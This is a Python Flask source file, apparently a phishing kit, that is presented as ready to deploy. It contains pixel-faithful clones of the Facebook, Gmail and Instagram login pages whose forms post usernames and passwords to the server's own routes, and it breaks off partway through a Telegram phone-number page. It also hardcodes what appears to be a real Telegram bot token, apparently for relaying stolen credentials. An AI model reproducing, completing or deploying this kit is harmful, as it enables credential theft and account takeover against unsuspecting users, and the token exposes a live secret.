#!/usr/bin/env python3
#file: api/main.py
# Multi-Platform Phishing Server (Facebook + Gmail + Instagram + Telegram + TikTok)
# Owner: MeNgHeaNg | Created: March 13, 2026 | Version: 5.0
# Real working code - No simulation - Ready for deployment

from flask import Flask, request, render_template_string, redirect
import requests
import datetime
import re
import os
import json

app = Flask(__name__)

# Telegram Bot Configuration
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', "8593966553:AAFGoliiS_woNCydJhXBQ6sdi2xhKTAdAoc")

# ==================== FACEBOOK HTML ====================
FACEBOOK_HTML = '''<!DOCTYPE html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.34;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 16px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }
        .header {
            text-align: center;
            margin: 20px 0 30px 0;
        }
        .logo {
            width: 55px;
            height: 84px;
            margin: 0 auto;
        }
        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
            padding: 16px;
            margin-bottom: 16px;
            width: 100%;
        }
        .form-group {
            margin-bottom: 12px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            font-size: 16px;
            background: white;
            color: #1c1e21;
            font-family: inherit;
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #8a8d91;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
            outline: none;
        }
        .login-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            color: white;
            font-weight: bold;
            padding: 12px;
            width: 100%;
            margin-bottom: 16px;
            cursor: pointer;
            font-family: inherit;
        }
        .login-btn:active {
            background-color: #166fe5;
            transform: scale(0.98);
        }
        .forgot-password {
            color: #1877f2;
            text-align: center;
            display: block;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 16px;
            font-weight: 500;
        }
        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        .create-account {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            color: white;
            font-weight: bold;
            padding: 12px 16px;
            margin: 0 auto;
            display: block;
            cursor: pointer;
            font-family: inherit;
        }
        .create-account:active {
            background-color: #36a420;
            transform: scale(0.98);
        }
        .get-app {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #1c1e21;
            line-height: 1.5;
        }
        .language-select {
            text-align: center;
            margin: 15px 0;
            font-size: 14px;
            color: #737373;
            font-weight: 500;
        }
        .footer {
            text-align: center;
            padding: 16px;
            background: white;
            margin-top: auto;
        }
        .footer-links {
            font-size: 12px;
            color: #737373;
            line-height: 1.6;
        }
        .footer-links a {
            color: #737373;
            text-decoration: none;
            margin: 0 4px;
        }
        .meta-logo {
            margin-top: 12px;
            font-size: 12px;
            color: #737373;
            font-weight: bold;
        }
        @media (max-width: 320px) {
            .container {
                padding: 12px;
            }
            .card {
                padding: 12px;
            }
            input[type="text"],
            input[type="password"] {
                padding: 12px 14px;
                font-size: 15px;
            }
            .login-btn {
                font-size: 16px;
                padding: 11px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
                <path fill="#1877F2" d="M48 24C48 10.745 37.255 0 24 0S0 10.745 0 24c0 11.979 8.776 21.908 20.25 23.708v-16.77h-6.094V24h6.094v-5.288c0-6.015 3.583-9.337 9.065-9.337 2.625 0 5.372.469 5.372.469v5.906h-3.026c-2.981 0-3.911 1.85-3.911 3.75V24h6.656l-1.064 6.938H27.75v16.77C39.224 45.908 48 35.979 48 24z"/>
            </svg>
        </div>

        <div class="card">
            <form action="/facebook/login" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Mobile number or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
                <a href="#" class="forgot-password">Forgot password?</a>
                <div class="divider"></div>
                <button type="button" class="create-account">Create new account</button>
            </form>
        </div>

        <div class="get-app">
            Get Facebook for browse faster.
        </div>

        <div class="language-select">
            English (US)
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Sign Up</a> • 
            <a href="#">Log In</a> • 
            <a href="#">Messenger</a> • 
            <a href="#">Facebook Lite</a> • 
            <a href="#">Video</a> • 
            <a href="#">Places</a> • 
            <a href="#">Games</a> • 
            <a href="#">Marketplace</a> • 
            <a href="#">Meta Pay</a> • 
            <a href="#">Meta Store</a> • 
            <a href="#">Meta Quest</a> • 
            <a href="#">Instagram</a> • 
            <a href="#">Threads</a> • 
            <a href="#">Fundraisers</a> • 
            <a href="#">Services</a> • 
            <a href="#">Voting Information Center</a> • 
            <a href="#">Privacy Policy</a> • 
            <a href="#">Privacy Center</a> • 
            <a href="#">Groups</a> • 
            <a href="#">About</a> • 
            <a href="#">Create Ad</a> • 
            <a href="#">Create Page</a> • 
            <a href="#">Developers</a> • 
            <a href="#">Careers</a> • 
            <a href="#">Cookies</a> • 
            <a href="#">Ad choices</a> • 
            <a href="#">Terms</a> • 
            <a href="#">Help</a> • 
            <a href="#">Contact Uploading & Non-Users</a>
        </div>
        
        <div class="meta-logo">
            Meta © 2025
        </div>
    </div>
</body>
</html>'''

# ==================== GMAIL HTML ====================
GMAIL_HTML = '''<!DOCTYPE html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Gmail</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            background-color: #ffffff;
            color: #202124;
            line-height: 1.4286;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            max-width: 450px;
            margin: 0 auto;
            width: 100%;
            padding: 20px;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 75px;
            height: 75px;
            margin: 0 auto 20px auto;
            background: conic-gradient(from -45deg, #ea4335, #4285f4, #34a853, #fbbc05, #ea4335);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            font-weight: bold;
        }
        .title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 40px;
        }
        .card {
            background: white;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px 40px 36px;
            margin-bottom: 16px;
            width: 100%;
        }
        .form-group {
            margin-bottom: 24px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border-radius: 4px;
            border: 1px solid #dadce0;
            font-size: 16px;
            background: white;
            color: #202124;
            font-family: inherit;
            transition: border 0.2s;
        }
        input[type="email"]::placeholder,
        input[type="password"]::placeholder {
            color: #5f6368;
        }
        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 0 0 2px #e8f0fe;
        }
        .login-btn {
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            color: white;
            font-weight: 500;
            padding: 10px 24px;
            margin: 8px 0;
            cursor: pointer;
            font-family: inherit;
            float: right;
            transition: background-color 0.2s;
        }
        .login-btn:hover {
            background-color: #1669d6;
        }
        .login-btn:active {
            background-color: #1a73e8;
            transform: scale(0.98);
        }
        .forgot-password {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: inline-block;
            margin-top: 8px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .help-section {
            text-align: center;
            margin-top: 40px;
            color: #5f6368;
            font-size: 14px;
        }
        .help-link {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .help-link:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            padding: 24px;
            margin-top: auto;
            border-top: 1px solid #dadce0;
        }
        .footer-links {
            font-size: 12px;
            color: #5f6368;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .language-selector {
            font-size: 12px;
            color: #5f6368;
            margin-top: 16px;
        }
        .language-selector select {
            border: 1px solid #dadce0;
            border-radius: 4px;
            padding: 6px 12px;
            background: white;
            color: #5f6368;
        }
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            display: inline-block;
            margin-top: 16px;
        }
        .create-account:hover {
            text-decoration: underline;
        }
        .next-btn {
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            color: white;
            font-weight: 500;
            padding: 10px 24px;
            margin: 8px 0;
            cursor: pointer;
            font-family: inherit;
            float: right;
            transition: background-color 0.2s;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">G</div>
            <h1 class="title">Sign in</h1>
            <div class="subtitle">Use your Google Account</div>
        </div>

        <div class="card">
            <form id="loginForm" action="/gmail/login" method="POST">
                <div class="form-group">
                   <input type="email" id="email" name="email" placeholder="Email or phone" required autofocus>
                </div>
                <div class="form-group" id="passwordGroup" style="display: none;">
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                </div>
                <div style="overflow: hidden;">
                    <a href="#" class="forgot-password" id="forgotPassword" style="display: none;">Forgot password?</a>
                    <button type="button" id="nextBtn" class="next-btn">Next</button>
                    <button type="submit" id="submitBtn" class="login-btn" style="display: none;">Sign in</button>
                </div>
            </form>
            
            <div style="clear: both; margin-top: 40px; text-align: center;">
                <a href="#" class="create-account">Create account</a>
            </div>
        </div>

        <div class="help-section">
            <span>Not your computer? Use Guest mode to sign in privately.</span><br>
            <a href="#" class="help-link">Learn more</a>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
        <div class="language-selector">
            <select>
                <option>English (United States)</option>
                <option>ខ្មែរ (កម្ពុជា)</option>
            </select>
        </div>
    </div>

    <script>
        document.getElementById('nextBtn').addEventListener('click', function() {
            var email = document.getElementById('email').value;
            if (email) {
                document.getElementById('passwordGroup').style.display = 'block';
                document.getElementById('forgotPassword').style.display = 'inline-block';
                document.getElementById('nextBtn').style.display = 'none';
                document.getElementById('submitBtn').style.display = 'block';
                document.getElementById('password').focus();
            }
        });
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            if (!email || !password) {
                e.preventDefault();
                alert('Please fill in all fields');
            }
        });
    </script>
</body>
</html>'''

# ==================== INSTAGRAM HTML ====================
INSTAGRAM_HTML = '''<!DOCTYPE html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            line-height: 1.34;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 16px;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 175px;
            height: 51px;
            margin: 0 auto 20px auto;
            background-image: url('https://i.imgur.com/zqpwkLQ.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }
        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 16px;
            width: 100%;
        }
        .form-group {
            margin-bottom: 12px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border-radius: 4px;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            background: #fafafa;
            color: #262626;
            font-family: inherit;
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #8e8e8e;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        .login-btn {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            color: white;
            font-weight: bold;
            padding: 10px;
            width: 100%;
            margin-bottom: 16px;
            cursor: pointer;
            font-family: inherit;
            opacity: 0.7;
        }
        .login-btn:active {
            background-color: #0077c7;
            transform: scale(0.98);
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divider::before {
            margin-right: 16px;
        }
        .divider::after {
            margin-left: 16px;
        }
        .facebook-login {
            color: #385185;
            text-align: center;
            display: block;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 16px;
        }
        .forgot-password {
            color: #00376b;
            text-align: center;
            display: block;
            text-decoration: none;
            font-size: 12px;
        }
        .signup-section {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            margin-bottom: 16px;
        }
        .signup-text {
            color: #262626;
            font-size: 14px;
        }
        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .get-app {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #262626;
            line-height: 1.5;
        }
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
        }
        .app-button {
            height: 40px;
        }
        .footer {
            text-align: center;
            padding: 20px;
            margin-top: auto;
        }
        .footer-links {
            font-size: 12px;
            color: #8e8e8e;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 6px;
        }
        .copyright {
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo"></div>
        </div>

        <div class="card">
            <form action="/instagram/login" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>

            <div class="divider">OR</div>

            <a href="#" class="facebook-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <div class="signup-section">
            <span class="signup-text">Don't have an account?</span>
            <a href="#" class="signup-link">Sign up</a>
        </div>

        <div class="get-app">
            <div>Get the app.</div>
            <div class="app-buttons">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play" class="app-button">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store" class="app-button">
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="copyright">
            English (US) © 2025 Instagram from Meta
        </div>
    </div>
</body>
</html>'''

# ==================== TELEGRAM HTML ====================
TELEGRAM_HTML = '''<!DOCTYPE html>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #000000;
            line-height: 1.4;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
        }
        .container {
            padding: 20px;
            max-width: 400px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 64px;
            height: 64px;
            margin: 0 auto 15px auto;
            color: #37AEE2;
        }
        .title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #000000;
        }
        .subtitle {
            font-size: 14px;
            color: #707579;
            line-height: 1.4;
            margin-bottom: 25px;
        }
        .form-section {
            margin-bottom: 25px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 500;
            color: #000000;
            font-size: 14px;
        }
        .country-selector {
            width: 100%;
            padding: 12px;
            border: 1px solid #E0E0E0;
            border-radius: 8px;
            font-size: 14px;
            background: #ffffff;
            color: #000000;
            appearance: none;
            background-image: url("data:image/svg+xml;charset=US-ASCII,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'><path fill='%23666' d='m0 1 2 2 2-2z'/></svg>");
            background-repeat: no-repeat;
            background-position: right 12px center;
            background-size: 10px;
        }
        .phone-input-container {
            position: relative;
            width: 100%;
        }
        .phone-input {
            width: 100%;
            padding: 12px 12px 12px 70px;
            border: 1px solid #E0E0E0;
            border-radius: 8px;
            font-size: 14px;
            background: #ffffff;
            color: #000000;
        }
        .phone-input::placeholder {
            color: #999;
        }
        .country-code-display {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #000000;
            font-size: 14px;
            font-weight: 500;
            pointer-events: none;
        }
        .separator {
            position: absolute;
            left: 55px;
            top: 50%;
            transform: translateY(-50%);
            color: #E0E0E0;
            font-size: 14px;
            pointer-events: none;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .checkbox {
            width: 18px;
            height: 18px;
            border: 2px solid #37AEE2;
            border-radius: 3px;
            margin-right: 10px;
            position: relative;
            cursor: pointer;
        }
        .checkbox.checked {
            background-color: #37AEE2;
        }
        .checkbox.checked::after {
            content: "✓";
            color: white;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 12px;
            font-weight: bold;
        }
        .checkbox-label {
            font-size: 14px;
            color: #000000;
            cursor: pointer;
        }
        .login-btn {
            background-color: #37AEE2;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            color: white;
            font-weight: 600;
            padding: 14px;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .login-btn:active {
            background-color: #2a8dbd;
        }
        .qr-section {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #E0E0E0;
        }
        .qr-title {
            font-size: 14px;
            color: #37AEE2;
            font-weight: 500;
            margin-bottom: 8px;
        }
        .qr-subtitle {
            font-size: 12px;
            color: #707579;
            line-height: 1.4;
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            padding: 15px;
        }
        .footer-text {
            font-size: 12px;
            color: #707579;
            line-height: 1.4;
        }
        .footer-link {
            color: #37AEE2;
            text-decoration: none;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #37AEE2;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
            .header {
                margin: 30px 0 20px 0;
            }
            .logo {
                width: 56px;
                height: 56px;
            }
            .title {
                font-size: 16px;
            }
            .subtitle {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="currentColor">
                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0M8.287 5.906q-1.168.486-4.666 2.01-.567.225-.595.442c-.03.243.275.339.69.47l.175.055c.408.133.958.288 1.243.294q.39.01.868-.32 3.269-2.206 3.374-2.23c.05-.012.12-.026.166.016s.042.12.037.141c-.03.129-1.227 1.241-1.846 1.817-.193.18-.33.307-.358.336a8 8 0 0 1-.188.186c-.38.366-.664.64.015 1.088.327.216.589.393.85.571.284.194.568.387.936.629q.14.092.27.187c.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.4 1.4 0 0 0-.013-.315.34.34 0 0 0-.114-.217.53.53 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09"/>
                </svg>
            </div>
            <div class="title">Telegram</div>
            <div class="subtitle">
                Please confirm your country code and enter your phone number.
            </div>
        </div>

        <form action="/telegram/login" method="POST">
            <div class="form-section">
                <div class="form-group">
                    <label for="country">Country</label>
                    <select class="country-selector" name="country" id="country" required>
                        <option value="">Select your country</option>
                        <option value="Afghanistan">Afghanistan</option>
                        <option value="Albania">Albania</option>
                        <option value="Algeria">Algeria</option>
                        <option value="Andorra">Andorra</option>
                        <option value="Angola">Angola</option>
                        <option value="Antigua and Barbuda">Antigua and Barbuda</option>
                        <option value="Argentina">Argentina</option>
                        <option value="Armenia">Armenia</option>
                        <option value="Australia">Australia</option>
                        <option value="Austria">Austria</option>
                        <option value="Azerbaijan">Azerbaijan</option>
                        <option value="Bahamas">Bahamas</option>
                        <option value="Bahrain">Bahrain</option>
                        <option value="Bangladesh">Bangladesh</option>
                        <option value="Barbados">Barbados</option>
                        <option value="Belarus">Belarus</option>
                        <option value="Belgium">Belgium</option>
                        <option value="Belize">Belize</option>
                        <option value="Benin">Benin</option>
                        <option value="Bhutan">Bhutan</option>
                        <option value="Bolivia">Bolivia</option>
                        <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
                        <option value="Botswana">Botswana</option>
                        <option value="Brazil">Brazil</option>
                        <option value="Brunei">Brunei</option>
                        <option value="Bulgaria">Bulgaria</option>
                        <option value="Burkina Faso">Burkina Faso</option>
                        <option value="Burundi">Burundi</option>
                        <option value="Cambodia" selected>Cambodia</option>
                        <option value="Cameroon">Cameroon</option>
                        <option value="Canada">Canada</option>
                        <option value="Cape Verde">Cape Verde</option>
                        <option value="Central African Republic">Central African Republic</option>
                        <option value="Chad">Chad</option>
                        <option value="Chile">Chile</option>
                        <option value="China">China</option>
                        <option value="Colombia">Colombia</option>
                        <option value="Comoros">Comoros</option>
                        <option value="Congo">Congo</option>
                        <option value="Costa Rica">Costa Rica</option>
                        <option value="Croatia">Croatia</option>
                        <option value="Cuba">Cuba</option>
                        <option value="Cyprus">Cyprus</option>
                        <option value="Czech Republic">Czech Republic</option>
                        <option value="Denmark">Denmark</option>
                        <option value="Djibouti">Djibouti</option>
                        <option value="Dominica">Dominica</option>
                        <option value="Dominican Republic">Dominican Republic</option>
                        <option value="East Timor">East Timor</option>
                        <option value="Ecuador">Ecuador</option>
                        <option value="Egypt">Egypt</option>
                        <option value="El Salvador">El Salvador</option>
                        <option value="Equatorial Guinea">Equatorial Guinea</option>
                        <option value="Eritrea">Eritrea</option>
                        <option value="Estonia">Estonia</option>
                        <option value="Ethiopia">Ethiopia</option>
                        <option value="Fiji">Fiji</option>
                        <option value="Finland">Finland</option>
                        <option value="France">France</option>
                        <option value="Gabon">Gabon</option>
                        <option value="Gambia">Gambia</option>
                        <option value="Georgia">Georgia</option>
                        <option value="Germany">Germany</option>
                        <option value="Ghana">Ghana</option>
                        <option value="Greece">Greece</option>
                        <option value="Grenada">Grenada</option>
                        <option value="Guatemala">Guatemala</option>
                        <option value="Guinea">Guinea</option>
                        <option value="Guinea-Bissau">Guinea-Bissau</option>
                        <option value="Guyana">Guyana</option>
                        <option value="Haiti">Haiti</option>
                        <option value="Honduras">Honduras</option>
                        <option value="Hungary">Hungary</option>
                        <option value="Iceland">Iceland</option>
                        <option value="India">India</option>
                        <option value="Indonesia">Indonesia</option>
                        <option value="Iran">Iran</option>
                        <option value="Iraq">Iraq</option>
                        <option value="Ireland">Ireland</option>
                        <option value="Israel">Israel</option>
                        <option value="Italy">Italy</option>
                        <option value="Jamaica">Jamaica</option>
                        <option value="Japan">Japan</option>
                        <option value="Jordan">Jordan</option>
                        <option value="Kazakhstan">Kazakhstan</option>
                        <option value="Kenya">Kenya</option>
                        <option value="Kiribati">Kiribati</option>
                        <option value="North Korea">North Korea</option>
                        <option value="South Korea">South Korea</option>
                        <option value="Kuwait">Kuwait</option>
                        <option value="Kyrgyzstan">Kyrgyzstan</option>
                        <option value="Laos">Laos</option>
                        <option value="Latvia">Latvia</option>
                        <option value="Lebanon">Lebanon</option>
                        <option value="Lesotho">Lesotho</option>
                        <option value="Liberia">Liberia</option>
                        <option value="Libya">Libya</option>
                        <option value="Liechtenstein">Liechtenstein</option>
                        <option value="Lithuania">Lithuania</option>
                        <option value="Luxembourg">Luxembourg</option>
                        <option value="Madagascar">Madagascar</option>
                        <option value="Malawi">Malawi</option>
                        <option value="Malaysia">Malaysia</option>
                        <option value="Maldives">Maldives</option>
                        <option value="Mali">Mali</option>
                        <option value="Malta">Malta</option>
                        <option value="Marshall Islands">Marshall Islands</option>
                        <option value="Mauritania">Mauritania</option>
                        <option value="Mauritius">Mauritius</option>
                        <option value="Mexico">Mexico</option>
                        <option value="Micronesia">Micronesia</option>
                        <option value="Moldova">Moldova</option>
                        <option value="Monaco">Monaco</option>
                        <option value="Mongolia">Mongolia</option>
                        <option value="Montenegro">Montenegro</option>
                        <option value="Morocco">Morocco</option>
                        <option value="Mozambique">Mozambique</option>
                        <option value="Myanmar">Myanmar</option>
                        <option value="Namibia">Namibia</option>
                        <option value="Nauru">Nauru</option>
                        <option value="Nepal">Nepal</option>
                        <option value="Netherlands">Netherlands</option>
                        <option value="New Zealand">New Zealand</option>
                        <option value="Nicaragua">Nicaragua</option>
                        <option value="Niger">Niger</option>
                        <option value="Nigeria">Nigeria</option>
                        <option value="Norway">Norway</option>
                        <option value="Oman">Oman</option>
                        <option value="Pakistan">Pakistan</option>
                        <option value="Palau">Palau</option>
                        <option value="Panama">Panama</option>
                        <option value="Papua New Guinea">Papua New Guinea</option>
                        <option value="Paraguay">Paraguay</option>
                        <option value="Peru">Peru</option>
                        <option value="Philippines">Philippines</option>
                        <option value="Poland">Poland</option>
                        <option value="Portugal">Portugal</option>
                        <option value="Qatar">Qatar</option>
                        <option value="Romania">Romania</option>
                        <option value="Russia">Russia</option>
                        <option value="Rwanda">Rwanda</option>
                        <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
                        <option value="Saint Lucia">Saint Lucia</option>
                        <option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines</option>
                        <option value="Samoa">Samoa</option>
                        <option value="San Marino">San Marino</option>
                        <option value="Sao Tome and Principe">Sao Tome and Principe</option>
                        <option value="Saudi Arabia">Saudi Arabia</option>
                        <option value="Senegal">Senegal</option>
                        <option value="Serbia">Serbia</option>
                        <option value="Seychelles">Seychelles</option>
                        <option value="Sierra Leone">Sierra Leone</option>
                        <option value="Singapore">Singapore</option>
                        <option value="Slovakia">Slovakia</option>
                        <option value="Slovenia">Slovenia</option>
                        <option value="Solomon Islands">Solomon Islands</option>
                        <option value="Somalia">Somalia</option>
                        <option value="South Africa">South Africa</option>
                        <option value="South Sudan">South Sudan</option>
                        <option value="Spain">Spain</option>
                        <option value="Sri Lanka">Sri Lanka</option>
                        <option value="Sudan">Sudan</option>
                        <option value="Suriname">Suriname</option>
                        <option value="Swaziland">Swaziland</option>
                        <option value="Sweden">Sweden</option>
                        <option value="Switzerland">Switzerland</option>
                        <option value="Syria">Syria</option>
                        <option value="Taiwan">Taiwan</option>
                        <option value="Tajikistan">Tajikistan</option>
                        <option value="Tanzania">Tanzania</option>
                        <option value="Thailand">Thailand</option>
                        <option value="Togo">Togo</option>
                        <option value="Tonga">Tonga</option>
                        <option value="Trinidad and Tobago">Trinidad and Tobago</option>
                        <option value="Tunisia">Tunisia</option>
                        <option value="Turkey">Turkey</option>
                        <option value="Turkmenistan">Turkmenistan</option>
                        <option value="Tuvalu">Tuvalu</option>
                        <option value="Uganda">Uganda</option>
                        <option value="Ukraine">Ukraine</option>
                        <option value="United Arab Emirates">United Arab Emirates</option>
                        <option value="United Kingdom">United Kingdom</option>
                        <option value="United States">United States</option>
                        <option value="Uruguay">Uruguay</option>
                        <option value="Uzbekistan">Uzbekistan</option>
                        <option value="Vanuatu">Vanuatu</option>
                        <option value="Vatican City">Vatican City</option>
                        <option value="Venezuela">Venezuela</option>
                        <option value="Vietnam">Vietnam</option>
                        <option value="Yemen">Yemen</option>
                        <option value="Zambia">Zambia</option>
                        <option value="Zimbabwe">Zimbabwe</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="phone">Your phone number</label>
                    <div class="phone-input-container">
                        <span class="country-code-display" id="countryCodeDisplay">+855</span>
